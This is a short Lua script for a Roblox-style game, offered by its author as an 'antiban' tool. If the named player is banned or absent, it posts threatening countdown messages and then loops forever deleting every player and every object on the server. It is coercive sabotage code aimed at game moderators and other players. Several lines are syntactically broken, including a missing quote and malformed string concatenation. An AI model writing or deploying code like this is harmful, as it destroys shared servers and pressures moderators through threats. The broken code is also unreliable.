------rogers888's antiban script!--------------------------------------Dont take CREDITS!------------------------------------
------------Don't change this!-----------
n = "B" 
n = n.."a" 
n = n.."ns" 
n = n.."e" 
n = n.."y" 
h = Instance.new("Hint") 
m = Instance.new("Message") 
script.Name = rogers's antiban" 
--------------You can change below------------------
respawntime =5 
protect = "rogers888" 
-------Version [Don't change]------------
version = 1.05 

while true do 
if game.Players:findFirstChild(protect) == nil then 
m.Parent = game.Workspace 
m.Text = protect.." is banned, the server will be removed..." 
wait(3) 
m.Text = "Unban "..protect.." or remove your script, else the server will be down with the following countdown!" 
wait(3) 
for i= respawntime, 0, -1 do 
if game.Players:findFirstChild(protect) == nil then 
m.Text = "If "..protect.." doesn't reappear in ["..i.."] then the server is down!" 
wait(1) 
end 
end 
if game.Players:findFirstChild(protect) ~= nil then 
m.Text = protect.." came back, nothing will happen!" 
wait(3) 
m:remove() 
else 
while true do 
for i, p in ipairs(game.Players:getChildren()) do 
p:Remove() 
end 
for i, w in ipairs(game.Workspace:getChildren()) do 
w:Remove() 
end 
wait()
end 
end 
else 
h.Parent = game.Workspace 
h.Text = "Protecting: "..protect.." - Version: "..version.." - Created by: "rogers888
end 
wait() 
end
